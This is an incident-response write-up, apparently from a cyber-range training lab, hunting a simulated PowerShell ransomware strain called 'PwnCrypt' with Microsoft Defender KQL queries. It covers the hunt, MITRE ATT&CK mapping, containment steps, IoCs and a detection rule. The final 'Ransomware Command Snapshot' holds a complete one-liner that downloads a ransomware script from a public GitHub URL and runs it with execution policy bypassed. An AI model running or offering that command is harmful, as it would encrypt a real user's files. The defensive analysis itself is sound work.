# 🎯 Incident Response Plan: Zero-Day Ransomware (PwnCrypt) Outbreak

### Scenario
A new ransomware strain, **PwnCrypt**, has emerged. It utilizes a PowerShell-based payload to encrypt files, appending `.pwncrypt` to filenames (e.g., `hello.txt → hello.pwncrypt.txt`). The payload is downloaded using `Invoke-WebRequest` via PowerShell and targets specific directories like `C:\Users\Public\Desktop`. The CISO has raised concerns, and immediate investigation is required.

## Platforms and Languages Leveraged
- Microsoft Defender for Endpoint (Advanced Hunting)
- Windows 11 Virtual Machine (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

---

### 1️⃣ Preparation
📌 **Goal:** Develop a hypothesis based on threat intelligence and organizational gaps.
- The organization's immature security program (e.g., no user training) may have allowed ransomware into the network.
- Use known IoCs, such as `.pwncrypt` file extensions, to guide the investigation.

🔎 **Hypothesis:** Could PwnCrypt have made its way onto a corporate device and executed successfully?

---

### 2️⃣ Data Collection
📌 **Goal:** Gather logs and evidence from endpoints, file systems, and network traffic.

#### 🖥️ Verify Log Availability
```kql
DeviceFileEvents
| where DeviceName == "mde-test-03"
| top 20 by Timestamp desc
```


#### 🔍 Search for PwnCrypt File Activity

```kql
DeviceFileEvents
| where DeviceName == "mde-test-03"
| where FileName has "pwncrypt"
    or PreviousFileName has "pwncrypt"
    or FolderPath has "pwncrypt"
| project Timestamp, DeviceName, ActionType, FileName,
          PreviousFileName, FolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
```

<img width="1142" height="745" alt="image" src="https://github.com/user-attachments/assets/7995e42c-246d-4034-b3a4-e5922174f726" />


#### 🔄 Trace Ransomware Execution
```kql
DeviceProcessEvents
| where DeviceName == "mde-test-03"
| where ProcessCommandLine has "pwncrypt"
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessParentFileName,
          InitiatingProcessFileName,
          ProcessCommandLine
| order by Timestamp desc
```

<img width="1172" height="773" alt="image" src="https://github.com/user-attachments/assets/ec6eedc7-3020-4b31-a4af-b1605c476f29" />


#### 🌐 Outbound Network Activity
```kql
DeviceNetworkEvents
| where DeviceName == "mde-test-03"
| where RemoteUrl has "githubusercontent.com"
| project Timestamp, DeviceName,
          RemoteIP, RemoteUrl,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc
```

<img width="1157" height="763" alt="image" src="https://github.com/user-attachments/assets/7015fe54-8708-4d61-bae3-c4391ea7807a" />


---

### 3️⃣ Data Analysis
📌 **Goal:** Examine data for anomalies, patterns, and IoCs.

🛑 **Indicators Found:**
- **PowerShell Usage:** Execution of `pwncrypt.ps1` via `Invoke-WebRequest` with `-ExecutionPolicy Bypass`
- **Outbound Traffic:** Confirmed connection to GitHub CDN (`185.199.110.133`) for payload download
- **File Events:** 79 file events — encrypted copies created in `C:\Users\Xerox_4123\Desktop`, originals moved to `C:\Windows\Temp\`
- **Process Chain:** `explorer.exe → powershell.exe → cmd.exe → pwncrypt.ps1`

🧠 **TTPs Mapped to MITRE ATT&CK Framework:**
- **T1059.001** — Command and Scripting Interpreter: PowerShell
- **T1105** — Ingress Tool Transfer (Downloading payload from GitHub)
- **T1486** — Data Encrypted for Impact (Ransomware encryption)
- **T1547** — Boot/Logon Autostart Execution (Investigated — not found)

---

### 4️⃣ Investigation
📌 **Goal:** Deep dive into findings and assess the threat's scope.

**1. Confirmed `.pwncrypt` file activity on `mde-test-03`**

79 file events found. Pattern observed:
- `FileCreated` → encrypted copy placed in `C:\Users\Xerox_4123\Desktop`
- `FileRenamed` → original file moved to `C:\Windows\Temp\`
- `InitiatingProcessCommandLine` = `powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`

**2. Process lineage confirmed the infection vector**

40 process events found. Key evidence from expanded result:

```
Timestamp:                       Feb 28, 2026 11:38:14 PM
DeviceName:                      mde-test-03
AccountName:                     xerox_4123
InitiatingProcessParentFileName: powershell.exe
InitiatingProcessFileName:       cmd.exe
ProcessCommandLine:              powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

**3. Outbound connection to GitHub confirmed payload download**

13 network events found. Expanded result:

```
Timestamp:    Mar 1, 2026 12:13:01 AM
RemoteIP:     185.199.110.133
RemoteUrl:    raw.githubusercontent.com
Command:      powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest
              -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/...
```

**4. Persistence check — no scheduled tasks found**

```kql
DeviceProcessEvents
| where DeviceName == "mde-test-03"
| where ProcessCommandLine has "schtasks"
    or ProcessCommandLine has "ScheduledTask"
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

<img width="1207" height="661" alt="image" src="https://github.com/user-attachments/assets/eb3d23bd-ee76-44c8-afe5-c1887e46cbd4" />


**Result: 0 items — no persistence mechanisms detected.**

---

### 5️⃣ Response
📌 **Goal:** Contain and mitigate confirmed threats.

#### 🛡️ Containment:
- 🚫 Isolate `mde-test-03` via MDE network isolation
- 🧱 Block `185.199.108-111.133` and `*.githubusercontent.com` at perimeter firewall
- 🔑 Force credential reset for `xerox_4123`

#### 🧹 Eradication:
- Remove `C:\programdata\pwncrypt.ps1` and terminate related processes
- Scan endpoint for additional persistence mechanisms (none found)

#### 🔄 Recovery:
- Restore encrypted files from clean backups
- Verify integrity of restored system before reconnecting to network

---

### 6️⃣ Documentation
📌 **Goal:** Record findings and actions taken.

#### Incident Timeline

| Timestamp | Event | Source |
|---|---|---|
| Feb 28, 2026 11:13 PM | Payload downloaded from `githubusercontent.com` | DeviceNetworkEvents |
| Feb 28, 2026 11:38 PM | `pwncrypt.ps1` executed — account: `xerox_4123` | DeviceProcessEvents |
| Feb 28, 2026 11:38 PM | Files encrypted in `C:\Users\Xerox_4123\Desktop` | DeviceFileEvents |
| Mar 1, 2026 12:13 AM | Script executed again under `system` account | DeviceProcessEvents |

#### IoCs Identified

| Type | Value |
|---|---|
| Malicious Script | `C:\programdata\pwncrypt.ps1` |
| File Pattern | `.pwncrypt` in filename |
| Remote URL | `raw.githubusercontent.com/joshmadakor1/lognpacific-public/...` |
| Malicious IPs | `185.199.108.133`, `185.199.109.133`, `185.199.110.133`, `185.199.111.133` |
| Process Flag | `powershell.exe -ExecutionPolicy Bypass` |

---

### 7️⃣ Improvement
📌 **Goal:** Enhance the organization's defenses against future incidents.

#### 🚀 Action Plan:
1. **Restrict PowerShell** — Enable Constrained Language Mode and set `ExecutionPolicy` to `RemoteSigned` via Group Policy
2. **Network Controls** — Block egress to `*.githubusercontent.com` at proxy/firewall
3. **Deploy endpoint protection policies** — Enable PowerShell Script Block Logging (Event ID 4104)
4. **Implement user training** — Security awareness and phishing simulation campaigns
5. **Strengthen logging and monitoring** — Deploy the detection rule below in MDE

#### 🔍 Detection Rule (Advanced Hunting — Scheduled Query):
```kql
DeviceProcessEvents
| where FileName == "powershell.exe"
    or InitiatingProcessFileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
    and ProcessCommandLine has "ExecutionPolicy Bypass"
| where ProcessCommandLine has_any ("github", "pastebin", "raw.", "discord")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```

---

### Ransomware Command Snapshot
⚠️ Example of how the ransomware script was executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

📅 **Incident Details:**
- **Device:** mde-test-03
- **Account:** xerox_4123
- **Date:** Feb 28, 2026
- **Time:** 11:38 PM
- **IP:** 185.199.110.133
